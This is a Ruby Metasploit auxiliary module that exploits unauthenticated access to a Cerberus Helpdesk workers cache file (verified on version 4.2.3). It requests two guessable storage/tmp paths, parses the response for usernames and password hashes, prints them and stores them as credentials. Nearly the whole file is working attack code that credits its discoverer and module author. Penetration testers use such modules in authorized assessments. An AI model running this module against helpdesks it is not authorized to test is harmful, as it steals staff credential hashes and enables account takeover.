##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'         => 'Cerberus Helpdesk User Hash Disclosure',
      'Description'  => %q{
        This module extracts usernames and password hashes from the Cerberus Helpdesk
        through an unauthenticated accss to a workers file.
        Verified on Version 4.2.3 Stable (Build 925)
        },
      'References'   =>
        [
          [ 'EDB', '39526' ]
        ],
      'Author'       => [
        'asdizzle_', #discovery
        'h00die',    #module
        ],
      'License'      => MSF_LICENSE
    )

    register_options(
      [
        OptString.new('URI', [false, 'URL of the Cerberus Helpdesk root', '/'])
      ])
  end

  def run_host(rhost)
    begin
      ['devblocks', 'zend'].each do |site|
        url = "#{datastore['URI']}storage/tmp/#{site}_cache---ch_workers"
        vprint_status("Attempting to load data from #{url}")
        res = send_request_cgi({'uri' => url})
        if not res
          print_error("#{peer} Unable to connect to #{url}")
        else
          if res.body.include?('pass')
            # the returned object looks json-ish, but it isn't. Unsure of format, so we'll do some ugly manual parsing.
            # this will be a rough equivalent to sed -e 's/s:5/\n/g' | grep email | cut -d '"' -f4,8 | sed 's/"/:/g'
            result = res.body.split('s:5')
            result.each do |cred|
              if cred.include?('email')
                cred = cred.split(':')
                username = cred[3].tr('";', '') # remove extra characters
                username = username[0...-1] # also remove trailing s
                password_hash = cred[7].tr('";', '') # remove extra characters
                print_good("#{username}:#{password_hash}")
                store_valid_credential(
                  user:         username,
                  private:      password_hash,
                  private_type: :nonreplayable_hash
                )
              end
            end
            break # no need to get the 2nd url
          else
            print_error("Invalid response received for #{url}")
          end
        end
      end

    rescue ::Rex::ConnectionError
      print_error("#{peer} Unable to connect to site")
      return
    end
  end
end
